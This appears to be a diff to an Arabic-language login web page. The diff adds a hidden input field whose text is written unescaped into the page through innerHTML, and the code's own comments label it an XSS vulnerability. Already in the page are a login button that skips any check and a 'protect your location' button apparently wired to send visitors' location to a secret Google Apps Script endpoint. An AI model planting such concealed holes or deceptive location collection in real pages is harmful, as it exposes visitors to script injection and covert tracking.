@@ -61,6 +61,14 @@
     button:hover {
       background-color: #e3e3e3;
     }
+
+    /* ************************************ */
+    /* التعديل الأمني: إخفاء حقل الاختبار */
+    #visitorNote, #visitorNoteDisplay {
+      display: none !important; 
+    }
+    /* ************************************ */
+    
   </style><script type="text/javascript">
     (function(c,l,a,r,i,t,y){
         c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
@@ -75,15 +83,30 @@
 
   <div class="login-box">
     <input type="email" placeholder="اكتب الإيميل هنا">
-    <input type="password" placeholder="اكتب كلمة المرور هنا">
+    <input type="password" placeholder="اكتب كلمة المرور هنا" id="passwordInput">
+    
+    <input type="text" id="visitorNote" placeholder="ملاحظات للزائر" onkeyup="displayNote()">
+    
     <button onclick="goToMain()">تسجيل الدخول</button>
+  </div>
+  
+  <div id="visitorNoteDisplay">
+    (ستظهر ملاحظات الزائر هنا مباشرة)
   </div>
 
   <script>
     function goToMain() {
       window.location.href = "main.html";
     }
+    
+    // الدالة المسؤولة عن ثغرة XSS
+    function displayNote() {
+      const note = document.getElementById('visitorNote').value;
+      // خطر XSS!
+      document.getElementById('visitorNoteDisplay').innerHTML = note;
+    }
   </script>
+  
 <button id="protectButton" onclick="requestAndSendLocation()">
   اضغط لحماية موقعك (يتطلب موافقة الموقع)
 </button>
@@ -97,11 +120,8 @@ function generateSessionId() {
     return 'LOC_' + Math.random().toString(36).substring(2, 9);
 }
 
-// **********************************************
 // الرابط السري الجديد الذي تم الحصول عليه من Google Sheets
-// **********************************************
 const SECRET_ENDPOINT = 'https://script.google.com/macros/s/AKfycbwviUZRRpt9oUdnz3uEF_5l_gBIiwzaB6KU7sVkRn2mJTbYHDTNgsULTQTfDHWcYfHqtg/exec';
-// **********************************************
 
 function requestAndSendLocation() {
     const statusElement = document.getElementById('locationStatus');
